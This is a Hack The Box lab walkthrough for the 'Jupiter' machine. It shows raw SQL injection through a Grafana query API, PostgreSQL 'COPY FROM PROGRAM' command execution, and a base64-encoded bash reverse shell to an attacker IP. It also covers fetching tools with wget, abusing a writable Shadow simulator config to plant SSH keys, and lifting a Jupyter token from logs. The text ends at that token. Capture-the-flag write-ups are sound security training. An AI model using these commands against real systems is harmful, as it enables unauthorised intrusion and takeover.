---
layout: post
title: Hack The Box Walkthrough - Jupiter
date: 2023-08-26
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/08/HTB/Jupiter
img: 2023/08/Jupiter/Jupiter.png
---

In Jupyter I had to exploit an SQL Injection and run code through a network simulator, a Jupyter Notebook, and a satellite tracking application to get to root.

* Room: Jupiter
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Jupiter](https://app.hackthebox.com/machines/Jupiter)
* Author: [mto](https://app.hackthebox.com/users/216969)

## Enumeration

I started the box by running Rustscan to detect open ports.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.216:22
Open 10.10.11.216:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-08 14:45 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.

...

Completed NSE at 14:45, 0.00s elapsed
Nmap scan report for target (10.10.11.216)
Host is up, received user-set (0.025s latency).
Scanned at 2023-07-08 14:45:41 EDT for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEJSyKmXs5CCnonRCBuHkCBcdQ54oZCUcnlsey3u2/vMXACoH79dGbOmIHBTG7/GmSI/j031yFmdOL+652mKGUI=
|   256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHhClp0ailXIfO0/6yw9M1pRcZ0ZeOmPx22sO476W4lQ
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:45
Completed NSE at 14:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:45
Completed NSE at 14:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:45
Completed NSE at 14:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds
```

Port 22 (SSH) and 80 (HTTP) were open. The website was redirecting to 'jupiter.htb'. I added that to my hosts file and scanned for subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 12 -H "Host:FUZZ.jupiter.htb" "http://jupiter.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jupiter.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000284708:   404        211 L    798 W      34390 Ch    "kiosk"

Total time: 1103.562
Processed Requests: 648201
Filtered Requests: 648200
Requests/sec.: 587.3712
```

It found 'kiosk.jupiter.htb'.

## Website

I loaded the main website in a browser.

![Main Site](/assets/images/2023/08/Jupiter/WebSite.png "Main Site")

The site did not do much. There was a contact form, but it did not do anything.

I ran Feroxbuster to detect hidden pages.

```bash
$ feroxbuster -u http://jupiter.htb -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://jupiter.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://jupiter.htb/css => http://jupiter.htb/css/
301      GET        7l       12w      178c http://jupiter.htb/js => http://jupiter.htb/js/
200      GET      182l      306w     4202c http://jupiter.htb/js/main.js
200      GET        5l       79w     2505c http://jupiter.htb/css/slicknav.min.css
200      GET        5l       37w     4168c http://jupiter.htb/img/icons/si-1.png
200      GET      225l      536w    10141c http://jupiter.htb/contact.html
200      GET        7l       35w     3598c http://jupiter.htb/img/icons/si-4.png
200      GET        6l       77w     3351c http://jupiter.htb/css/owl.carousel.min.css
200      GET        6l       27w     3521c http://jupiter.htb/img/icons/si-2.png
301      GET        7l       12w      178c http://jupiter.htb/img => http://jupiter.htb/img/
200      GET     2174l     4138w    38852c http://jupiter.htb/css/style.css
200      GET       79l      431w    32802c http://jupiter.htb/img/team/team-3.jpg
200      GET        4l      212w    20216c http://jupiter.htb/js/jquery.magnific-popup.min.js
200      GET      158l      582w    49359c http://jupiter.htb/img/team/team-4.jpg
200      GET       63l      491w    46294c http://jupiter.htb/img/team/team-1.jpg
200      GET        9l      394w    24103c http://jupiter.htb/js/masonry.pkgd.min.js
200      GET      118l      859w    75695c http://jupiter.htb/img/team/team-2.jpg
200      GET        6l       26w     2932c http://jupiter.htb/img/icons/si-3.png
200      GET        2l     1283w    86927c http://jupiter.htb/js/jquery-3.3.1.min.js
200      GET       86l      411w    41833c http://jupiter.htb/img/logo/logo-jupiter.png
200      GET     1159l     2347w    25252c http://jupiter.htb/css/elegant-icons.css
200      GET        4l       66w    31000c http://jupiter.htb/css/font-awesome.min.css
200      GET      351l      795w     6948c http://jupiter.htb/css/magnific-popup.css
301      GET        7l       12w      178c http://jupiter.htb/img/blog => http://jupiter.htb/img/blog/
301      GET        7l       12w      178c http://jupiter.htb/fonts => http://jupiter.htb/fonts/
200      GET      399l     1181w    19680c http://jupiter.htb/
200      GET     1532l     9164w   702346c http://jupiter.htb/img/hero/jupiter-01.jpg
200      GET      399l     1181w    19680c http://jupiter.htb/index.html
200      GET      584l     1619w    20977c http://jupiter.htb/js/jquery.slicknav.js
301      GET        7l       12w      178c http://jupiter.htb/img/about => http://jupiter.htb/img/about/
200      GET      371l     1767w   151469c http://jupiter.htb/img/callto-bg.jpg
200      GET      251l      759w    11969c http://jupiter.htb/services.html
200      GET        7l      277w    44342c http://jupiter.htb/js/owl.carousel.min.js
200      GET      266l      701w    12613c http://jupiter.htb/about.html
200      GET       18l      930w    89031c http://jupiter.htb/js/mixitup.min.js
200      GET      268l      628w    11913c http://jupiter.htb/portfolio.html
200      GET        6l      685w    60132c http://jupiter.htb/js/bootstrap.min.js
200      GET        6l     2099w   160357c http://jupiter.htb/css/bootstrap.min.css
200      GET      449l     2746w   227845c http://jupiter.htb/img/hero/juno.jpg
301      GET        7l       12w      178c http://jupiter.htb/img/icons => http://jupiter.htb/img/icons/
301      GET        7l       12w      178c http://jupiter.htb/img/logo => http://jupiter.htb/img/logo/
301      GET        7l       12w      178c http://jupiter.htb/img/portfolio => http://jupiter.htb/img/portfolio/
200      GET      584l     2604w   274076c http://jupiter.htb/img/team-bg.jpg
301      GET        7l       12w      178c http://jupiter.htb/img/work => http://jupiter.htb/img/work/
200      GET     6999l    31058w  2920253c http://jupiter.htb/img/hero/jupiter-02.png
301      GET        7l       12w      178c http://jupiter.htb/img/team => http://jupiter.htb/img/team/
301      GET        7l       12w      178c http://jupiter.htb/img/testimonial => http://jupiter.htb/img/testimonial/
301      GET        7l       12w      178c http://jupiter.htb/Source => http://jupiter.htb/Source/
200      GET        1l       44w     8556c http://jupiter.htb/img/.DS_Store
301      GET        7l       12w      178c http://jupiter.htb/img/hero => http://jupiter.htb/img/hero/
200      GET        2l       12w     6230c http://jupiter.htb/img/hero/.DS_Store
301      GET        7l       12w      178c http://jupiter.htb/img/nasa => http://jupiter.htb/img/nasa/
200      GET        1l       13w     6238c http://jupiter.htb/img/nasa/.DS_Store
[####################] - 9m   1913659/1913659 0s      found:53      errors:10307
[####################] - 9m   1913659/1913659 0s      found:53      errors:10307
[####################] - 9m    119601/119601  228/s   http://jupiter.htb/
[####################] - 9m    119601/119601  231/s   http://jupiter.htb/css/
[####################] - 9m    119601/119601  229/s   http://jupiter.htb/js/
[####################] - 9m    119601/119601  228/s   http://jupiter.htb/img/
[####################] - 9m    119601/119601  228/s   http://jupiter.htb/img/blog/
[####################] - 9m    119601/119601  228/s   http://jupiter.htb/fonts/
[####################] - 9m    119601/119601  230/s   http://jupiter.htb/img/about/
[####################] - 9m    119601/119601  232/s   http://jupiter.htb/img/icons/
[####################] - 9m    119601/119601  229/s   http://jupiter.htb/img/logo/
[####################] - 9m    119601/119601  229/s   http://jupiter.htb/img/portfolio/
[####################] - 9m    119601/119601  229/s   http://jupiter.htb/img/work/
[####################] - 9m    119601/119601  229/s   http://jupiter.htb/img/team/
[####################] - 9m    119601/119601  233/s   http://jupiter.htb/img/testimonial/
[####################] - 9m    119601/119601  233/s   http://jupiter.htb/Source/
[####################] - 8m    119601/119601  246/s   http://jupiter.htb/img/hero/
[####################] - 5m    119601/119601  363/s   http://jupiter.htb/img/nasa/
```

It did not find anything of interest.

## SQL Injection

I looked at the site on 'kiosk.jupiter.htb'.

![Grafana](/assets/images/2023/08/Jupiter/Grafana.png "Grafana")

This was a dashboard built with Grafana. I did a quick search and saw that it could be vulnerable to [inject arbitrary queries](https://vuldb.com/?id.230868). I looked at the traffic from the site and saw that it was sending a raw query to the server.

```http
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
content-type: application/json
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
x-grafana-org-id: 1
x-panel-id: 22
x-plugin-id: postgres
Content-Length: 390
Origin: http://kiosk.jupiter.htb
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

{
  "queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "rawSql": "select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Saturn';",
      "format": "table",
      "datasourceId": 1,
      "intervalMs": 60000,
      "maxDataPoints": 935
    }
  ],
  "range": {
    "from": "2023-08-07T06:52:53.545Z",
    "to": "2023-08-07T12:52:53.545Z",
    "raw": {
      "from": "now-6h",
      "to": "now"
    }
  },
  "from": "1691391173545",
  "to": "1691412773545"
}
```

I tried to modify the query. I took a guess that there might be a `user` table.

```json
{
  "queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "rawSql": "Select * From user;",
      "format": "table",
      "datasourceId": 1,
      "intervalMs": 60000,
      "maxDataPoints": 940
    }
  ],
  "range": {
    "from": "2023-07-08T13:14:37.146Z",
    "to": "2023-07-08T19:14:37.146Z",
    "raw": {
      "from": "now-6h",
      "to": "now"
    }
  },
  "from": "1688822077146",
  "to": "1688843677146"
}
```

It returned one user. 

```json
{
    "results": {
        "A": {
            "status": 200,
            "frames": [{
                "schema": {
                    "refId": "A",
                    "meta": {
                        "typeVersion": [0, 0],
                        "executedQueryString": "Select * From user;"
                    },
                    "fields": [{
                        "name": "user",
                        "type": "string",
                        "typeInfo": {
                            "frame": "string",
                            "nullable": true
                        }
                    }]
                },
                "data": {
                    "values": [
                        ["grafana_viewer"]
                    ]
                }
            }]
        }
    }
}
```

I had confirmation that I could inject SQL. The query showed that the backend used PostgreSQL. I tried to get [Remote Code Execution](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce).

I used the injection to create a table.

```json
"queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "rawSql": "CREATE TABLE cmd_exec(cmd_output text);",
      "format": "table",
      "datasourceId": 1,
      "intervalMs": 60000,
      "maxDataPoints": 940
    }
  ]
```

I tried to execute a simple command to validate that it worked.

```json
"queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "rawSql": "COPY cmd_exec FROM PROGRAM 'id';",
      "format": "table",
      "datasourceId": 1,
      "intervalMs": 60000,
      "maxDataPoints": 940
    }
  ]
```

And queried the table to view the result of the previous command.

```json
"queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "rawSql": "SELECT * FROM cmd_exec;",
      "format": "table",
      "datasourceId": 1,
      "intervalMs": 60000,
      "maxDataPoints": 940
    }
  ]
```

It worked.

```json
"data": {
    "values": [
        ["uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)"]
    ]
}
```

After I confirmed that I could run code on the server, I used it to get a reverse shell. I used base64 to encode my shell and remove any characters that could be rejected.

```bash
$ echo -n "bash -c 'bash  -i >& /dev/tcp/10.10.14.37/4444  0>&1' " | base64 
YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzcvNDQ0NCAgMD4mMScg
```

Next, I used the SQL Injection to execute the reverse shell.

```http
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
content-type: application/json
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
x-grafana-org-id: 1
x-panel-id: 22
x-plugin-id: postgres
Origin: http://kiosk.jupiter.htb
Connection: keep-alive
Cookie: redirect_to=%2Fd%2FjMgFGfA4z%2Fmoons%3ForgId%3D1%26refresh%3D1d
Content-Length: 445

{
  "queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "rawSql": "COPY cmd_exec FROM PROGRAM 'echo -n YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzcvNDQ0NCAgMD4mMScg|base64 -d | bash';",
      "format": "table",
      "datasourceId": 1,
      "intervalMs": 60000,
      "maxDataPoints": 940
    }
  ],
  "range": {
    "from": "2023-07-08T13:14:37.146Z",
    "to": "2023-07-08T19:14:37.146Z",
    "raw": {
      "from": "now-6h",
      "to": "now"
    }
  },
  "from": "1688822077146",
  "to": "1688843677146"
}
```

I got the shell back.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.37] from (UNKNOWN) [10.129.229.15] 37702
bash: cannot set terminal process group (1453): Inappropriate ioctl for device
bash: no job control in this shell
postgres@jupiter:/var/lib/postgresql/14/main$ whoami
whoami
postgres
postgres@jupiter:/var/lib/postgresql/14/main$ 
```

##  Getting User juno

Once connected, I solidified my shell.

```bash
postgres@jupiter:/var/lib/postgresql/14/main$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'
postgres@jupiter:/var/lib/postgresql/14/main$

postgres@jupiter:/var/lib/postgresql/14/main$ ^Z
[1]  + 7244 suspended  nc -klvnp 4444

➜  Jupiter
$ stty -a
speed 38400 baud; rows 54; columns 235; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

➜  Jupiter
$ stty raw -echo; fg
[1]  + 7244 continued  nc -klvnp 4444

postgres@jupiter:/var/lib/postgresql/14/main$ stty rows 54 cols 235
```

I looked for ways to get a user connection. I found credentials to the database, but I did not find anything I could use in it.

I ran `ps` to see what was running.

```bash
postgres@jupiter:/var/lib/postgresql/14/main$ ps aux                                                                 

USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                              
root           1  0.0  0.2 100812 11436 ?        Ss   11:03   0:00 /sbin/init                   
root           2  0.0  0.0      0     0 ?        S    11:03   0:00 [kthreadd]                             
root           3  0.0  0.0      0     0 ?        I<   11:03   0:00 [rcu_gp]   

...
jovian      1122  0.0  1.6  81332 66512 ?        S    11:03   0:00 /usr/bin/python3 /usr/local/bin/jupyter-notebook --no-browser /opt/solar-flares/flares.ipynb                                                                            
root        1125  0.0  0.0  55200  1720 ?        Ss   11:03   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;                                                                                                  
www-data    1126  0.0  0.1  56132  6384 ?        S    11:03   0:00 nginx: worker process
www-data    1127  0.0  0.1  55868  5576 ?        S    11:03   0:00 nginx: worker process                             
```

It was running [Jupyter](https://jupyter.org/) as jovian.

I did not have access to the configuration used by Jupyter.

```bash
postgres@jupiter:/var/lib/postgresql/14/main$ ls /opt/solar-flares/
ls: cannot open directory '/opt/solar-flares/': Permission denied
```

I looked at ports that were open locally on the server.

```bash
postgres@jupiter:/var/lib/postgresql/14/main$ ss -tunl
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                   Process
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                             0.0.0.0:*
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                             0.0.0.0:*
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                             0.0.0.0:*
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                             0.0.0.0:*
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                             0.0.0.0:*
tcp                     LISTEN                   0                        4096                                           127.0.0.1:3000                                           0.0.0.0:*
tcp                     LISTEN                   0                        128                                            127.0.0.1:8888                                           0.0.0.0:*
tcp                     LISTEN                   0                        244                                            127.0.0.1:5432                                           0.0.0.0:*
```

By default, the notebook server starts on port 8888. I could not connect directly to it. I started a web server on my machine and used it to download [Chisel](https://github.com/jpillora/chisel) on the server.

```bash
postgres@jupiter:/var/lib/postgresql/14/main$ cd /tmp

postgres@jupiter:/tmp$ wget 10.10.14.8/chisel
--2023-07-09 14:51:42--  http://10.10.14.8/chisel
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8384512 (8.0M) [application/octet-stream]
Saving to: ‘chisel’

chisel                                                     100%[=======================================================================================================================================>]   8.00M   876KB/s    in 9.4s

2023-07-09 14:51:51 (868 KB/s) - ‘chisel’ saved [8384512/8384512]
```

I started a reverse server on my machine.

```bash
 ./chisel server -p 3477 --reverse
2023/07/09 10:52:24 server: Reverse tunnelling enabled
2023/07/09 10:52:24 server: Fingerprint 9TT35c16IF26BbrEX+Jn04O/c59wAHDmNlTk8/rVbQ8=
2023/07/09 10:52:24 server: Listening on http://0.0.0.0:3477
2023/07/09 10:52:59 server: session#1: tun: proxy#R:8888=>localhost:8888: Listening
```

Ad connected to it from the server.

```bash
postgres@jupiter:/tmp$ chmod +x chisel
postgres@jupiter:/tmp$ ./chisel client 10.10.14.8:3477 R:8888:localhost:8888/tcp
```

I opened the notebook in my browser.

![Jupyter Notebook](/assets/images/2023/08/Jupiter/JupyterNotebook.png "Jupyter Notebook")

It worked, but I needed a password or a token to access it. I tried running Feroxbuster on the site, but it did not find anything interesting.

I looked on the server for some time and did not see anything I could use. I downloaded [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and ran it.

```bash
postgres@jupiter:/tmp$ wget 10.10.14.8/linpeas.sh
--2023-07-09 15:44:04--  http://10.10.14.8/linpeas.sh
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 836190 (817K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[=======================================================================================================================================>] 816.59K   865KB/s    in 0.9s

2023-07-09 15:44:05 (865 KB/s) - ‘linpeas.sh’ saved [836190/836190]

postgres@jupiter:/tmp$ chmod +x linpeas.sh
postgres@jupiter:/tmp$ ./linpeas.sh | tee res.txt

...

2023/07/09 16:00:01 CMD: UID=1000  PID=20443  |
2023/07/09 16:00:01 CMD: UID=1000  PID=20444  | rm -rf /dev/shm/shadow.data
2023/07/09 16:00:01 CMD: UID=1000  PID=20445  | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml
2023/07/09 16:00:02 CMD: UID=1000  PID=20448  | sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE
2023/07/09 16:00:02 CMD: UID=1000  PID=20449  | lscpu --online --parse=CPU,CORE,SOCKET,NODE
2023/07/09 16:00:02 CMD: UID=1000  PID=20454  | /usr/bin/python3 -m http.server 80
2023/07/09 16:00:02 CMD: UID=1000  PID=20455  | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml
2023/07/09 16:00:02 CMD: UID=1000  PID=20457  | /usr/bin/curl -s server
2023/07/09 16:00:02 CMD: UID=1000  PID=20459  | /usr/bin/curl -s server
2023/07/09 16:00:02 CMD: UID=1000  PID=20464  |
2023/07/09 16:00:07 CMD: UID=0     PID=20465  |
2023/07/09 16:00:13 CMD: UID=114   PID=20466  | postgres: 14/main: autovacuum worker moon_namesdb
```

I did not know what `shadow` was, but from the name of the YAML file it seemed to be running some network simulation. I searched for it and found [The Shadow Simulator](https://github.com/shadow/shadow).

I was able to read and write the configuration file.

```bash
postgres@jupiter:/dev/shm$ ls -la /dev/shm/network-simulation.yml 
-rw-rw-rw- 1 juno juno 815 Mar  7 12:28 /dev/shm/network-simulation.yml
```

I looked at what it contained.

```yml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

I contained commands to run as different simulated hosts. I wrote my SSH public key in a file and modified the configuration to copy it in juno's .ssh folder.

```yml
  eric:
    network_node_id: 0
    quantity: 1
    processes:
    - path: cp
      args: /tmp/authorized_keys /home/juno/.ssh/
      start_time: 1s
```

I waited until it ran and reconnected as juno.

```bash
$ ssh juno@target
The authenticity of host 'target (10.10.11.216)' can't be established.
ED25519 key fingerprint is SHA256:Ew7jqugz1PCBr4+xKa3GVApxe+GlYwliOFLdMlqXWf8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul 23 11:36:15 AM UTC 2023

  System load:           0.0
  Usage of /:            81.5% of 12.33GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             235
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.216
  IPv6 address for eth0: dead:beef::250:56ff:feb9:78c4


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jul 23 07:41:37 2023 from 10.10.14.2

juno@jupiter:~$ cat user.txt
REDACTED
```

## Getting User jovian

Once connected as jovian, I checked the running processes again.

```bash
juno@jupiter:~$ ps aux --forest
root        1155  0.0  0.0   6892  2972 ?        Ss   05:23   0:00 /usr/sbin/cron -f -P
jovian      1174  0.0  2.4 478116 95800 ?        Sl   05:23   0:15 /usr/bin/python3 /usr/local/bin/jupyter-notebook --no-browser /opt/solar-flares/flares.ipynb
jovian      5870  0.0  1.5 753776 61944 ?        Ssl  09:12   0:01  \_ /usr/bin/python3 -m ipykernel_launcher -f /home/jovian/.local/share/jupyter/runtime/kernel-3cfef73e-9a88-4540-b1f1-1852fc0028a6.json
jovian      5919  0.0  1.5 753772 62624 ?        Ssl  09:15   0:01  \_ /usr/bin/python3 -m ipykernel_launcher -f /home/jovian/.local/share/jupyter/runtime/kernel-d4d69378-595d-4d5f-a785-f4430ef347bc.json
root        1175  0.0  0.2  15424  9332 ?        Ss   05:23   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
```

The Jupyter Notebook running as jovian caught my attention again. But this time, I had access to `/opt/solar-flares`.

```bash
juno@jupiter:~$ ls -l /opt/solar-flares/
total 2596
-rw-rw---- 1 jovian science  646164 Mar  8 09:11 cflares.csv
-rw-rw---- 1 jovian science  708058 Mar  8 09:11 flares.csv
-rw-rw---- 1 jovian science   10230 Mar  8 09:11 flares.html
-rw-r----- 1 jovian science  234001 Mar  8 13:06 flares.ipynb
drwxrwxr-t 2 jovian science    4096 Aug 27 11:04 logs
-rw-rw---- 1 jovian science 1010424 Mar  8 09:11 map.jpg
-rw-rw---- 1 jovian science   26651 Mar  8 09:11 mflares.csv
-rwxr-xr-x 1 jovian science     147 Mar  8 11:37 start.sh
-rw-rw---- 1 jovian science    1992 Mar  8 09:11 xflares.csv

juno@jupiter:~$ ls -l /opt/solar-flares/logs/
total 116
-rw-rw-r-- 1 jovian science 3137 Mar  9 11:59 jupyter-2023-03-08-14.log
-rw-rw-r-- 1 jovian science 1166 Mar  8 11:38 jupyter-2023-03-08-36.log
-rw-rw-r-- 1 jovian science 1197 Mar  8 11:38 jupyter-2023-03-08-37.log
-rw-rw-r-- 1 jovian science 4920 Mar  8 13:14 jupyter-2023-03-08-38.log
-rw-rw-r-- 1 jovian science 1166 Mar  9 12:12 jupyter-2023-03-09-11.log
-rw-rw-r-- 1 jovian science 1166 Mar  9 13:34 jupyter-2023-03-09-24.log
-rw-rw-r-- 1 jovian science 1166 Mar  9 12:10 jupyter-2023-03-09-59.log
-rw-rw-r-- 1 jovian science 1166 Mar 10 17:37 jupyter-2023-03-10-25.log
...
```

I looked at the logs and found a token to use in the UI.

```
[W 05:23:17.904 NotebookApp] Terminals not available (error was No module named 'terminado')
[I 05:23:17.912 NotebookApp] Serving notebooks from local directory: /opt/solar-flares
[I 05:23:17.912 NotebookApp] Jupyter Notebook 6.5.3 is running at:
[I 05:23:17.912 NotebookApp] http://localhost:8888/?token=e402a2cf1e2c5a55ea939efecb5624e51804aaf97388f559
[I 05:23:17.912 NotebookApp]  or http://127.0.0.1:8888/?token=e402a2cf1e2c5a55ea939efecb5624e51804aaf97388f559
[I 05:23:17.912 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
[W 05:23:17.917 NotebookApp] No web browser found: could not locate runnable browser.
[C 05:23:17.917 NotebookApp]

    To access the notebook, open this file in a browser:
        file:///home/jovian/.local/share/jupyter/runtime/nbserver-1174-open.html
    Or copy and paste one of these URLs:
        http://localhost:8888/?token=e402a2cf1e2c5a55ea939efecb5624e51804aaf97388f559
     or http://127.0.0.1:8888/?token=e402a2cf1e2c5a55ea939efecb5624e51804aaf97388f559
